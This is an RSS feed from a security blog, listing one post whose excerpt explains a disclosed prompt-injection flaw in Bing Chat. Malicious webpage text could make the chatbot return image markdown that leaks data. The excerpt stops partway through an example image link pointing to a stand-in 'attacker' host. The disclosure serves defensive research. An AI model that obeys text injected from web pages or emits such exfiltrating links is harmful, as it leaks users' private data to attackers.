<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>msrc on Embrace The Red</title>
    <link>https://embracethered.com/blog/tags/msrc/</link>
    <description>Recent content in msrc on Embrace The Red</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>(c) WUNDERWUZZI 2018-2025</copyright>
    <lastBuildDate>Sun, 18 Jun 2023 00:01:02 -0700</lastBuildDate><atom:link href="https://embracethered.com/blog/tags/msrc/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Bing Chat: Data Exfiltration Exploit Explained</title>
      <link>https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</link>
      <pubDate>Sun, 18 Jun 2023 00:01:02 -0700</pubDate>
      
      <guid>https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</guid>
      <description>This post describes how I found a Prompt Injection attack angle in Bing Chat that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.
The Vulnerability - Image Markdown Injection When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.
Imagine the LLM returns the following text:
![data exfiltration in progress](https://attacker/logo.</description>
    </item>
    
  </channel>
</rss>
